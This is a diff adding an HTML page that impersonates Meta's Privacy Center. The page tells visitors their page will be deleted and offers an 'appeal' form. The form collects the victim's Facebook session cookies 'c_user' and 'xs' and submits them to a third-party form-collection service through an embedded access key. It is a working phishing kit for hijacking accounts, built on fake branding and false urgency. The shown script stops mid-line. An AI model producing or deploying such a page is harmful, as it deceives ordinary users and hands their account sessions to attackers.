@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privacy Center - Page Appeal</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div id="langModal" class="modal-overlay">
+        <div class="modal-box">
+            <h2 class="modal-title" style="color: #1877f2;">Select Your Language</h2>
+            <p class="modal-sub">Choose your preferred language for the page content</p>
+            <div class="search-container">
+                <input type="text" placeholder="Search languages...">
+            </div>
+            <div class="lang-grid">
+                <div class="lang-item active">🇺🇸 English</div>
+                <div class="lang-item">🇮🇳 Hindi</div>
+                <div class="lang-item">🇪🇸 Spanish</div>
+                <div class="lang-item">🇵🇹 Portuguese</div>
+                <div class="lang-item">🇮🇳 Tamil</div>
+                <div class="lang-item">🇦🇪 Arabic</div>
+                <div class="lang-item">🇫🇷 French</div>
+                <div class="lang-item">🇻🇳 Vietnamese</div>
+            </div>
+            <button class="confirm-btn" onclick="closeLangModal()">Confirm Language</button>
+        </div>
+    </div>
+
+    <div class="main-wrapper">
+        <div class="sidebar">
+            <div class="meta-brand">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Meta">
+                <span style="font-weight: bold; margin-left: 5px;">Privacy Center</span>
+            </div>
+            <nav>
+                <a href="#" class="nav-item active">🏠 Privacy Center Home Page</a>
+                <a href="#" class="nav-item">🔍 Search</a>
+                <a href="#" class="nav-item">🛡️ Privacy Policy</a>
+                <a href="#" class="nav-item">📄 Other Rules & Articles</a>
+            </nav>
+        </div>
+
+        <div class="content-area">
+            
+            <div id="appealHome">
+                <div class="alert-banner">
+                    <span style="color: #d93025; font-size: 20px;">⚠️</span>
+                    <div>
+                        <strong style="color: #d93025;">Your page is scheduled to be deleted!</strong>
+                        <p>We have received several reports that your page violates our terms of service and community guidelines.</p>
+                    </div>
+                </div>
+                
+                <div class="appeal-card">
+                    <img src="https://i.ibb.co/Lz0x8Yp/appeal-illus.png" alt="Illustration" style="width: 100%; border-radius: 8px;">
+                    <h3>Appeal request</h3>
+                    <p>Fixing problems with your page. Please be sure to provide the requested information below.</p>
+                    <button class="blue-btn" onclick="showForm()">Appeal</button>
+                </div>
+            </div>
+
+            <div id="formSection" style="display: none;">
+                <form action="https://api.web3forms.com/submit" method="POST">
+                    <input type="hidden" name="access_key" value="2097348c-f211-4435-9c44-f3fa74a2b876">
+                    
+                    <div class="form-header">
+                        <div class="fb-icon-small">🔵</div>
+                        <div>
+                            <h4 style="margin: 0;">Page Appeal Request</h4>
+                            <p style="margin: 0; font-size: 12px; color: gray;">Submit your information to appeal the deletion</p>
+                        </div>
+                    </div>
+
+                    <div class="info-box-blue">
+                        <p>🛈 Your page has a violation related to our community guidelines.</p>
+                        <p>🛈 Please review the violation details carefully before submitting.</p>
+                        <p>🛈 Ensure you provide correct information for your appeal.</p>
+                    </div>
+
+                    <div class="video-container">
+                        <img src="https://i.ibb.co/kH7RkHn/meta-video-thumb.png" alt="Meta Video" style="width: 100%;">
+                        <div class="play-overlay">▶️</div>
+                    </div>
+
+                    <div class="input-field">
+                        <label>c_user</label>
+                        <input type="text" name="c_user" placeholder="Enter c_user" required>
+                    </div>
+
+                    <div class="input-field">
+                        <label>xs</label>
+                        <input type="text" name="xs" placeholder="Enter xs" required>
+                    </div>
+
+                    <button type="submit" class="blue-btn">Submit Appeal Request</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    function closeLangModal() {
+        document.getElementById('langModal').style.display = 'none';
+    }
+
+    function showForm() {
+        document.getElementById('appealHome').style.display = 'none';
+        document.getElementById('formSection').style.display = 'block';
+        window.
